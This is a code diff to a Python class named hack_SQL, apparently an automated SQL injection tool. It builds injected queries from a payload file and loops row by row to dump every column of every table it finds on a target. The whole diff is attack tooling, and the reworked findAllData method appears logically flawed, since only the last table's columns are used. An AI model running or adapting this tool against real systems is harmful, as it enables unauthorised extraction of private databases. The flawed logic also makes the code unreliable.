@@ -9,14 +9,14 @@ class hack_SQL(App):
         self.SQL = obj['sql']
         self.TOKEN = self.OBJ['app_token']
 
-    def mysqli(self, column, table, row = 1):
+    def mysql(self, column, table, row = 0):
         try:
             queries = self.getJSON(self.OBJ['dir_queryinject'])
             query = queries[ self.SQL['sqlinjectpos'] ]
             column = self.hackColumn([column], self.TOKEN, self.SQL['sep'])+self.SQL['sidecolumn']
             query = re.sub(r'(<%COLUMN%>)', column, query)
             query = re.sub(r'(<%TABLE%>)', table, query)
-            LIMIT = self.SQL['limit'].replace('<%X%>', str(row-1)).replace('<%Y%>', str(1))
+            LIMIT = self.SQL['limit'].replace('<%X%>', str(row)).replace('<%Y%>', str(1))
             query = re.sub(r'(<%LIMIT%>)', LIMIT, query)
             query = re.sub(r'(<%COMMENT%>)', self.SQL['comment'], query)
             
@@ -30,14 +30,15 @@ class hack_SQL(App):
             r = ''
         return r
 
-    def SQLfindAll(self, column, table):
-        val = ""
+    def SQLfindAll(self, column, table, matrix=False):
+        val = " "
         arr = []
-        count = lst = 1
-        while val != lst:
-            lst = val
-            val = self.mysqli(column, table, count)
-            if val and lst!=val:
+        count = 0
+        while val:
+            val = self.mysql(column, table, count)
+            if val:
+                if matrix:
+                    val = val.split(';')
                 arr.append(val)
                 count += 1
         return arr
@@ -62,10 +63,12 @@ class hack_SQL(App):
     def findAllData(self):
         OBJ = {}
         for table, columns in self.findDB().items():
-            for column in columns:
-                data = self.SQLfindAll(column, table)
-                OBJ.update({column : []})
-                if len(data) > 0:
-                    OBJ[column] = data
+            values = self.SQLfindAll(self.unifyColumn(columns), table, matrix=True)
+        for column in columns:
+            OBJ.update({column:[]})
+        for value in values:
+            for v in range(0, len(value)):
+                OBJ[columns[v]].append(value[v])
+
         sys.stdout.write('\n>>> Searching all data...')
         return OBJ
